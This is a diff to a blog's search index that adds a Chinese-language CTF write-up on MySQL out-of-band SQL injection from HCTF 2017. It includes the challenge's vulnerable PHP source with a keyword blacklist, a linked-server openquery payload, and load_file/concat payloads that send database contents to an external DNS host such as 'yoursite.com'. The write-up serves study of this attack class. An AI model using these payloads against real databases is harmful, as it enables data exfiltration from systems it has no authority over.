@@ -3,6 +3,39 @@
   
     
     <entry>
+      <title><![CDATA[OOBz注入]]></title>
+      <url>/2017/11/14/MySQL%20OOB%E6%B3%A8%E5%85%A5/</url>
+      <content type="html"><![CDATA[<h1 id="MYSQL-OOB-带外注入"><a href="#MYSQL-OOB-带外注入" class="headerlink" title="MYSQL OOB(带外注入)"></a>MYSQL OOB(带外注入)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章起于2017hctf中的一道注入题，第一次遇见但确实比较有意思，所以记录下来。<br>原题是一个简单的页面，提示网站的数据库还没有完成，但是页面显示是连接到sql server数据库的。通过目录扫描获得网站部分源码的zip文件。<br><a id="more"></a>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="built_in">echo</span> <span class="string">"Bob received a mission to write a login system on someone else's server, and he he only finished half of the work&lt;br /&gt;"</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"flag is hctf&#123;what you get&#125;&lt;br /&gt;&lt;br /&gt;"</span>;</div><div class="line">error_reporting(E_ALL^E_NOTICE^E_WARNING);</div><div class="line"></div><div class="line">try &#123;</div><div class="line">   <span class="variable">$conn</span> = new PDO( <span class="string">"sqlsrv:Server=*****;Database=not_here"</span>,<span class="string">"oob"</span>, <span class="string">""</span>); </div><div class="line">&#125;</div><div class="line"></div><div class="line">catch( PDOException <span class="variable">$e</span> ) &#123;</div><div class="line">   die( <span class="string">"Error connecting to SQL Server"</span>.<span class="variable">$e</span>-&gt;getMessage() ); </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#echo "Connected to MySQL&lt;br /&gt;";</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Connected to SQL Server&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i'</span>, <span class="variable">$id</span>)) &#123;</div><div class="line">	die(<span class="string">'NoNoNo'</span>);</div><div class="line">&#125;</div><div class="line"><span class="variable">$query</span> = <span class="string">"select message from not_here_too where id = <span class="variable">$id</span>"</span>; //link server: On  linkname:mysql</div><div class="line"></div><div class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;query( <span class="variable">$query</span> ); </div><div class="line"><span class="keyword">while</span> ( @<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;fetch( PDO::FETCH_ASSOC ) )&#123;</div><div class="line">	//TO DO: ...</div><div class="line">	//It<span class="string">'s time to sleep...</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>从源码中看出其过滤了sql server 的命令函数，并且提示<code>link server: On</code>,<code>linkname:mysql</code>,一搜才发现原来可以在sql server中可以设置连接到mysql数据库，从mysql中获取数据。具体连接语句<code>id=1 select * from openquery(mysql,&#39;select * from config&#39;);</code>就可以连接到本地或者远程的mysql数据库。</p>
+<h2 id="什么是带外注入"><a href="#什么是带外注入" class="headerlink" title="什么是带外注入"></a>什么是带外注入</h2><p>OOB攻击是通过外部通道，例如<em>http(s)请求</em>，DNS解析，文件系统和电子邮件系统等服务通道将数据库中的信息带出。而一般的sql注入我们是直接在数据库中直接获取数据库信息。</p>
+<p>##利用条件<br>MySQL中有一个名为secure_file_priv的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的操作。</p>
+<ul>
+<li>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。</li>
+<li>如果变量为空，则不会产生影响，引起不安全的配置。</li>
+<li>如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。</li>
+</ul>
+<p>在MySQL 5.5.53之前，此变量默认为空，因此我们就可以使用这些函数。但是在5.5.53之后的版本中，NULL值会禁用这些功能。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量，它是一个只读变量，你不能在运行时改变它。也就是说如果此种注入比较依赖版本。</p>
+<h2 id="使用DNS解析提取数据"><a href="#使用DNS解析提取数据" class="headerlink" title="使用DNS解析提取数据"></a>使用DNS解析提取数据</h2><p>在mysql中会对查询语句中的ip和网址尝试DNS解析。例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(‘\\\\’,<span class="keyword">database</span>()’yoursite.com\\a.txt’));</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="number">0x5c5c5c5c</span>,<span class="keyword">database</span>(),<span class="number">0x796F7572736974652E636F6D5C5C612E747874</span>));</div></pre></td></tr></table></figure></p>
+<p>为了直观演示我们在本地输入上面第二条payload</p>
+<p><img src="http://ourd90bac.bkt.clouddn.com/OOB4.jpg" alt=""><br>然后我们抓包看Mysql发出的DNS查询数据<br><img src="http://ourd90bac.bkt.clouddn.com/OOB5.jpg" alt=""><br>我们可以看到mysql直接将我们的查询语句verson()返回的数据user发送给了DNS服务器。<br>然后我们在我们的DNS服务器上（这里网上有现成的<a href="http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。" target="_blank" rel="external">http://dnsbin.zhack.ca/）就可以看到mysql发过来的数据,例如我查询的是数据库的版本号。</a><br><img src="http://ourd90bac.bkt.clouddn.com/OOB3.jpg" alt=""></p>
+<p>就是这样，我们就通过DNS通道，完成了和普通mysql注入同样的数据查询效果。</p>
+<p>回到原题，利用这个思路，我们就可以很清楚地爆出题目的数据，原题数据如下，这里就只贴出数据库的名字，后续的用一般手法注入就行了：<br><img src="http://ourd90bac.bkt.clouddn.com/OOB.jpg" alt=""></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> OOB </tag>
+            
+            <tag> 注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[密码学总结系列]]></title>
       <url>/2017/11/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97/</url>
       <content type="html"><![CDATA[<h1 id="密码学总结（一）-古典密码汇总"><a href="#密码学总结（一）-古典密码汇总" class="headerlink" title="密码学总结（一） 古典密码汇总"></a>密码学总结（一） 古典密码汇总</h1><blockquote>
@@ -245,9 +278,9 @@
         
         <tags>
             
-            <tag> XML </tag>
-            
             <tag> 注入 </tag>
+            
+            <tag> XML </tag>
             
             <tag> 源码读取 </tag>
             
@@ -321,9 +354,9 @@ var_dump( $a != 1);
         
         <tags>
             
-            <tag> 渗透 </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> 渗透 </tag>
             
             <tag> php </tag>
             
@@ -412,9 +445,9 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
         
         <tags>
             
-            <tag> 渗透 </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> 渗透 </tag>
             
         </tags>
         
@@ -493,9 +526,9 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
         
         <tags>
             
-            <tag> 渗透 </tag>
-            
             <tag> CTF </tag>
+            
+            <tag> 渗透 </tag>
             
         </tags>
         
